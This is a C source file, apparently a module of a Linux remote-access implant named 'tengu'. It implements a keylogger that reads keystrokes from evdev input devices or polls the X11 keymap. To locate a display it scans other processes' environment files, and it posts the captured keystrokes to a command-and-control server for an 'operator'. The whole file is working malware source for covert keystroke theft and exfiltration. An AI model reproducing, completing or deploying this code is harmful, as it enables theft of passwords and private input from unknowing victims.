#define _GNU_SOURCE
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <poll.h>
#include <time.h>
#include <dlfcn.h>
#include <linux/input.h>

#include "tengu.h"

// ---------------------------------------------------------------------------
// Keycode tables for evdev path (US QWERTY)
// ---------------------------------------------------------------------------

static const char keymap_lo[256] = {
    [2]='1',[3]='2',[4]='3',[5]='4',[6]='5',
    [7]='6',[8]='7',[9]='8',[10]='9',[11]='0',
    [12]='-',[13]='=',[14]='\b',[15]='\t',
    [16]='q',[17]='w',[18]='e',[19]='r',[20]='t',
    [21]='y',[22]='u',[23]='i',[24]='o',[25]='p',
    [26]='[',[27]=']',[28]='\n',
    [30]='a',[31]='s',[32]='d',[33]='f',[34]='g',
    [35]='h',[36]='j',[37]='k',[38]='l',
    [39]=';',[40]='\'',[41]='`',[43]='\\',
    [44]='z',[45]='x',[46]='c',[47]='v',[48]='b',
    [49]='n',[50]='m',[51]=',',[52]='.',[53]='/',
    [57]=' ',
};

static const char keymap_hi[256] = {
    [2]='!',[3]='@',[4]='#',[5]='$',[6]='%',
    [7]='^',[8]='&',[9]='*',[10]='(',[11]=')',
    [12]='_',[13]='+',[14]='\b',[15]='\t',
    [16]='Q',[17]='W',[18]='E',[19]='R',[20]='T',
    [21]='Y',[22]='U',[23]='I',[24]='O',[25]='P',
    [26]='{',[27]='}',[28]='\n',
    [30]='A',[31]='S',[32]='D',[33]='F',[34]='G',
    [35]='H',[36]='J',[37]='K',[38]='L',
    [39]=':',[40]='"',[41]='~',[43]='|',
    [44]='Z',[45]='X',[46]='C',[47]='V',[48]='B',
    [49]='N',[50]='M',[51]='<',[52]='>',[53]='?',
    [57]=' ',
};

// ---------------------------------------------------------------------------
// evdev path
// ---------------------------------------------------------------------------

static char* find_keyboard(void) {
    FILE* f = fopen("/proc/bus/input/devices", "r");
    if (!f) return NULL;

    char line[256];
    char handlers[256] = {0};
    int  is_kbd = 0;

    while (fgets(line, sizeof(line), f)) {
        if (strncmp(line, "B: EV=", 6) == 0) {
            unsigned long ev = strtoul(line + 6, NULL, 16);
            is_kbd = (ev & 0x10002) == 0x10002;
        }
        if (strncmp(line, "H: Handlers=", 12) == 0) {
            strncpy(handlers, line + 12, sizeof(handlers) - 1);
        }
        if (line[0] == '\n' && is_kbd && handlers[0]) {
            char* p = strstr(handlers, "event");
            if (p) {
                char evname[32];
                int n = 0;
                while (p[n] && p[n] != ' ' && p[n] != '\n' && n < 31)
                    evname[n] = p[n++];
                evname[n] = '\0';
                fclose(f);
                char* path = malloc(32);
                if (path) snprintf(path, 32, "/dev/input/%s", evname);
                return path;
            }
            is_kbd = 0;
            handlers[0] = '\0';
        }
    }
    fclose(f);
    return NULL;
}

static int keylog_evdev(int fd, int duration_secs, char* buf, size_t bufsz) {
    size_t pos   = 0;
    int    shift = 0;
    int    caps  = 0;

    struct pollfd pfd = { .fd = fd, .events = POLLIN };
    time_t deadline = time(NULL) + duration_secs;

    while (time(NULL) < deadline && pos < bufsz - 16) {
        int timeout_ms = (int)((deadline - time(NULL)) * 1000);
        if (timeout_ms <= 0) break;
        if (timeout_ms > 200) timeout_ms = 200;

        if (poll(&pfd, 1, timeout_ms) <= 0) continue;

        struct input_event ev;
        if (read(fd, &ev, sizeof(ev)) != sizeof(ev)) continue;
        if (ev.type != EV_KEY) continue;

        int code = ev.code;

        if (code == 42 || code == 54) { shift = (ev.value != 0); continue; }
        if (code == 58) { if (ev.value == 1) caps = !caps; continue; }
        if (ev.value != 1 && ev.value != 2) continue;
        if (code >= 256) continue;

        int upper = shift ^ caps;
        char c = upper ? keymap_hi[code] : keymap_lo[code];

        if (c == '\b' && pos < bufsz - 5) {
            buf[pos++] = '['; buf[pos++] = 'B'; buf[pos++] = 'S'; buf[pos++] = ']';
        } else if (c == '\t' || c == '\n') {
            buf[pos++] = c;
        } else if (c != 0) {
            buf[pos++] = c;
        } else {
            pos += snprintf(buf + pos, bufsz - pos - 1, "[K%d]", code);
        }
    }
    buf[pos] = '\0';
    return (int)pos;
}

// ---------------------------------------------------------------------------
// X11 path (dlopen - no compile-time dependency)
// ---------------------------------------------------------------------------

typedef void*         Display;
typedef unsigned long KeySym;
typedef unsigned int  KeyCode;

typedef Display* (*pfn_XOpenDisplay)(const char*);
typedef int      (*pfn_XQueryKeymap)(Display*, char[32]);
typedef KeySym   (*pfn_XkbKeycodeToKeysym)(Display*, KeyCode, int, int);
typedef int      (*pfn_XCloseDisplay)(Display*);

// Return the DISPLAY string: env first, then scan /proc/*/environ.
static char g_display_buf[64];
static const char* find_display(void) {
    const char* d = getenv("DISPLAY");
    if (d) return d;

    // Scan running processes for a DISPLAY env var.
    int found = 0;
    FILE* f = fopen("/proc/self/environ", "r"); // placeholder open
    if (f) fclose(f);

    // Walk /proc/<pid>/environ
    int pids[512];
    int npids = 0;
    FILE* proc = popen("ls /proc", "r");
    if (proc) {
        char line[16];
        while (fgets(line, sizeof(line), proc) && npids < 512) {
            int pid = atoi(line);
            if (pid > 0) pids[npids++] = pid;
        }
        pclose(proc);
    }

    for (int i = 0; i < npids && !found; i++) {
        char path[64];
        snprintf(path, sizeof(path), "/proc/%d/environ", pids[i]);
        int fd = open(path, O_RDONLY);
        if (fd < 0) continue;
        char env[4096] = {0};
        ssize_t n = read(fd, env, sizeof(env) - 1);
        close(fd);
        if (n <= 0) continue;
        char* p = env;
        char* end = env + n;
        while (p < end) {
            size_t len = strnlen(p, (size_t)(end - p));
            if (strncmp(p, "DISPLAY=", 8) == 0 && len > 8 && len < 60) {
                snprintf(g_display_buf, sizeof(g_display_buf), "%s", p + 8);
                found = 1;
                break;
            }
            p += len + 1;
        }
    }

    return found ? g_display_buf : ":0";
}

static int keylog_x11(int duration_secs, char* buf, size_t bufsz) {
    void* xlib = dlopen("libX11.so.6", RTLD_LAZY);
    if (!xlib) return -1;

    pfn_XOpenDisplay        XOpenDisplay        = dlsym(xlib, "XOpenDisplay");
    pfn_XQueryKeymap        XQueryKeymap        = dlsym(xlib, "XQueryKeymap");
    pfn_XkbKeycodeToKeysym  XkbKeycodeToKeysym  = dlsym(xlib, "XkbKeycodeToKeysym");
    pfn_XCloseDisplay       XCloseDisplay       = dlsym(xlib, "XCloseDisplay");

    if (!XOpenDisplay || !XQueryKeymap || !XkbKeycodeToKeysym || !XCloseDisplay) {
        dlclose(xlib);
        return -1;
    }

    const char* disp_str = find_display();
    Display* dpy = XOpenDisplay(disp_str);
    if (!dpy) {
        // try :0 directly
        dpy = XOpenDisplay(":0");
        if (!dpy) { dlclose(xlib); return -1; }
    }

    size_t pos = 0;
    char prev[32] = {0};
    char curr[32];

    time_t deadline = time(NULL) + duration_secs;

    while (time(NULL) < deadline && pos < bufsz - 32) {
        usleep(12000); // ~12ms poll interval (~83 Hz)
        XQueryKeymap(dpy, curr);

        for (int kc = 8; kc < 256; kc++) {
            int byte = kc / 8;
            int bit  = kc % 8;
            int was  = (prev[byte] >> bit) & 1;
            int now  = (curr[byte] >> bit) & 1;
            if (!now || was) continue; // only rising edges

            // Shift state: keycodes 50 (L), 62 (R)
            int shift = ((curr[50/8] >> (50%8)) & 1) | ((curr[62/8] >> (62%8)) & 1);
            KeySym ks = XkbKeycodeToKeysym(dpy, (KeyCode)kc, 0, shift ? 1 : 0);

            if (ks == 0xff0d || ks == 0xff8d) {           // Return
                buf[pos++] = '\n';
            } else if (ks == 0xff09) {                     // Tab
                buf[pos++] = '\t';
            } else if (ks == 0xff08) {                     // BackSpace
                if (pos < bufsz - 5) {
                    buf[pos++] = '['; buf[pos++] = 'B';
                    buf[pos++] = 'S'; buf[pos++] = ']';
                }
            } else if (ks == 0xff1b) {                     // Escape
                if (pos < bufsz - 6)
                    pos += snprintf(buf + pos, bufsz - pos - 1, "[ESC]");
            } else if (ks >= 0x20 && ks <= 0x7e) {        // printable ASCII
                buf[pos++] = (char)ks;
            }
            // ignore other special keys silently
        }
        memcpy(prev, curr, 32);
    }

    XCloseDisplay(dpy);
    dlclose(xlib);
    buf[pos] = '\0';
    return (int)pos;
}

// ---------------------------------------------------------------------------
// Public entry point
// ---------------------------------------------------------------------------

void cmd_keylog(uint32_t req_id, int duration_secs) {
    if (duration_secs <= 0) duration_secs = 30;

    size_t bufsz = 8192;
    char*  buf   = calloc(1, bufsz);
    if (!buf) return;

    int method = 0; // 0=none, 1=evdev, 2=x11
    int n = 0;

    // --- try evdev ---
    char* dev = find_keyboard();
    if (dev) {
        int fd = open(dev, O_RDONLY | O_NONBLOCK);
        free(dev);
        if (fd >= 0) {
            n = keylog_evdev(fd, duration_secs, buf, bufsz);
            close(fd);
            method = 1;
        }
    }

    // --- fallback: X11 ---
    if (method == 0) {
        n = keylog_x11(duration_secs, buf, bufsz);
        if (n >= 0) method = 2;
    }

    if (method == 0) {
        free(buf);
        const char* err =
            "keylog: no access to keyboard device\n"
            "  evdev: /dev/input/eventX requires 'input' group or root\n"
            "  X11:   libX11.so.6 not found or DISPLAY not reachable\n"
            "  hint:  usermod -aG input <user>  then re-login";
        Buf* pkt = build_output_packet(req_id, COMMAND_ERROR, err);
        g_c2_post(pkt->data, pkt->size, NULL, NULL);
        buf_free(pkt);
        return;
    }

    if (n == 0) {
        strcpy(buf, "(no keystrokes captured)");
    }

    // Prepend the method used for operator info.
    char header[64];
    snprintf(header, sizeof(header), "[via %s]\n", method == 1 ? "evdev" : "X11");
    size_t hlen = strlen(header);
    size_t clen = strlen(buf);
    if (hlen + clen + 1 < bufsz) {
        memmove(buf + hlen, buf, clen + 1);
        memcpy(buf, header, hlen);
    }

    Buf* pkt = build_output_packet(req_id, COMMAND_OUTPUT, buf);
    free(buf);
    g_c2_post(pkt->data, pkt->size, NULL, NULL);
    buf_free(pkt);
}
